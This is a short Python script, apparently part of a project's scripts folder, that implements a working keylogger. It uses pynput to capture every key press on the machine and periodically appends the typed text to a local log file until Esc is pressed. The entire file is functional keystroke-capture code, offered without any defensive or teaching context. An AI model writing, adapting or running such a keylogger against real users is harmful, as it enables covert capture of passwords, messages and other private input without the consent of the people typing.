# File: scripts/keystroke_interception.py

from pynput.keyboard import Key, Listener
import os

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))          
    count += 1
    if count >= 10:  # Save to log file after 10 key presses
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    # Ensure the log directory exists
    log_dir = os.path.join(os.path.dirname(__file__), '..', 'data')
    os.makedirs(log_dir, exist_ok=True)

    # Log file path
    log_file_path = os.path.join(log_dir, 'log.txt')

    # Write keystrokes to log file
    with open(log_file_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") > 0:
                f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False

def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_listener()
